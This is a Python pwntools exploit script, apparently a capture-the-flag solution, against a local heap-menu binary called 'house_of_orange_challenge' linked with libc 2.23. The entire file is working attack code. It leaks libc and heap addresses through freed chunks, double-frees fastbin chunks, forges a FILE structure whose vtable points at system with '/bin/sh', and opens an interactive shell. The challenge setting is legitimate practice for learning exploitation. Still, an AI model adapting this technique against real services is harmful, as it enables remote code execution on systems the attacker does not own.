#!/usr/bin/python2
# -*- coding:utf-8 -*-

from pwn import *
import os
import struct
import random
import time
import sys
import signal

def clear(signum=None, stack=None):
    print('Strip  all debugging information')
    os.system('rm -f /tmp/gdb_symbols* /tmp/gdb_pid /tmp/gdb_script')
    exit(0)

for sig in [signal.SIGINT, signal.SIGHUP, signal.SIGTERM]: 
    signal.signal(sig, clear)
    
# # Create a symbol file for GDB debugging
# try:
#     gdb_symbols = '''
    
#     '''

#     f = open('/tmp/gdb_symbols.c', 'w')
#     f.write(gdb_symbols)
#     f.close()
#     os.system('gcc -g -shared /tmp/gdb_symbols.c -o /tmp/gdb_symbols.so')
#     # os.system('gcc -g -m32 -shared /tmp/gdb_symbols.c -o /tmp/gdb_symbols.so')
# except Exception as e:
#     pass

context.arch = 'amd64'
# context.arch = 'i386'
# context.log_level = 'debug'
execve_file = './house_of_orange_challenge'
# sh = process(execve_file, env={'LD_PRELOAD': '/tmp/gdb_symbols.so'})
# sh = process(execve_file)
sh = remote('localhost', 10001)
elf = ELF(execve_file)
libc = ELF('./libc-2.23.so')
# libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

# Create temporary files for GDB debugging
try:
    gdbscript = '''
    
    '''

    f = open('/tmp/gdb_pid', 'w')
    f.write(str(proc.pidof(sh)[0]))
    f.close()

    f = open('/tmp/gdb_script', 'w')
    f.write(gdbscript)
    f.close()
except Exception as e:
    pass

def add(size, content):
    sh.sendlineafter('Your choice: ', '1')
    sh.sendlineafter('Size: ', str(size))
    sh.sendafter('Content: ', content)

def delete(index):
    sh.sendlineafter('Your choice: ', '2')
    sh.sendlineafter('Index: ', str(index))

def show(index):
    sh.sendlineafter('Your choice: ', '3')
    sh.sendlineafter('Index: ', str(index))

add(0x1f7, '\n')
add(0x67, '\n')
delete(0)
add(0x1f7, '\n')
delete(0)
show(2)
sh.recvuntil('Content: ')
main_arena_addr = u64(sh.recvn(6) + '\0\0') - 88
success('main_arena_addr: ' + hex(main_arena_addr))
libc_addr = main_arena_addr - (libc.symbols['__malloc_hook'] + 0x10)
success('libc_addr: ' + hex(libc_addr))

delete(1)
add(0x67, '\n')
add(0x67, '\n')
delete(4)
delete(1)
delete(4)
show(3)
sh.recvuntil('Content: ')
heap_addr = u64(sh.recvn(6) + '\0\0') & (~0xfff)
success('heap_addr: ' + hex(heap_addr))

add(0x67, p64(heap_addr + 0x80) + p64(0) * 2 + p64(libc_addr + libc.symbols['system']) + p64(0) * 7 + p64(0x71) + p64(0xdead)[:-1])

add(0x187, '\0' * 0xb0 + p64(0) + p64(0) + p64(0) + p64(heap_addr + 0x30)) # vtable
delete(6)

add(0x67, '\n')
add(0x67, '\n')
add(0x67, '/bin/sh\0' + p64(0x61) + p64(0) + p64(main_arena_addr + 0xa00 - 0x10) + p64(2) + p64(3))

sh.sendlineafter('Your choice: ', '1')
sh.sendlineafter('Size: ', str(0))

sh.interactive()
clear()
